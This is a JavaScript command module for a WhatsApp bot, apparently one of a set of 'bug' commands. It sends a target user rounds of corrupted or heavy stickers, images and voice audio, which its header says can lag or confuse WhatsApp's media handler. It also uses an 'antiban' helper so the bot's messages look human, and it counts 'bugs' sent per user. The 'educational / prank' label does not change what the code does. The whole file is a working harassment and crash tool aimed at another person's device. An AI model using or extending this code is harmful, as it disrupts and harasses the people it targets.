/**
 * 🐛 Tech God Bug 2026 — Creepy Media (Sticker + Image + Audio Bomb)
 * Sends CREEPY media files (corrupted/heavy stickers, images, audio)
 * that can lag or confuse WhatsApp's media handler.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando (payload source: CREEPY_MD-V1)
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');
const fs      = require('fs');
const path    = require('path');

const mediaDir = path.join(__dirname, 'creepy-data');

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  if (!config.bugsEnabled.crash) {
    return antiban.sendHuman(sock, jid, { text: '❌ Crash bugs are currently disabled.' }, { quoted: msg });
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Creepy Media*\n\n*Usage:* ${config.prefix}creepymedia @user [rounds]\n*Example:* ${config.prefix}creepymedia @someone 3\n\n_Sends heavy stickers, images, and audio that lag WhatsApp's media renderer._`,
    }, { quoted: msg });
  }

  const rounds = Math.min(parseInt(args[1]) || 3, 8);

  await antiban.sendHuman(sock, jid, {
    text: `🐛 *Sending CREEPY media bomb...*\n🎯 Target: @${target.split('@')[0]}\n💣 Rounds: ${rounds}\n⚡ Payload: Sticker + Image + Audio`,
    mentions: [target]
  }, { quoted: msg });

  const mediaSequence = [
    { file: 'x.webp', type: 'sticker' },
    { file: 'xx1.png', type: 'image' },
    { file: 'xx2.jpg', type: 'image' },
    { file: 'x.mp3', type: 'audio' },
  ];

  let sent = 0;
  for (let i = 0; i < rounds; i++) {
    const media = mediaSequence[i % mediaSequence.length];
    const filePath = path.join(mediaDir, media.file);

    try {
      if (!fs.existsSync(filePath)) continue;
      const buffer = fs.readFileSync(filePath);

      if (media.type === 'sticker') {
        await sock.sendMessage(target, { sticker: buffer });
      } else if (media.type === 'image') {
        await sock.sendMessage(target, { image: buffer, caption: '🐛' });
      } else if (media.type === 'audio') {
        await sock.sendMessage(target, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
      }

      sent++;
      await new Promise(r => setTimeout(r, 500));
    } catch (e) {
      // Skip failed media
    }
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, {
    text: `✅ *Creepy media sent!*\n🐛 ${sent} media files delivered to @${target.split('@')[0]}`,
    mentions: [target]
  }, { quoted: msg });
};
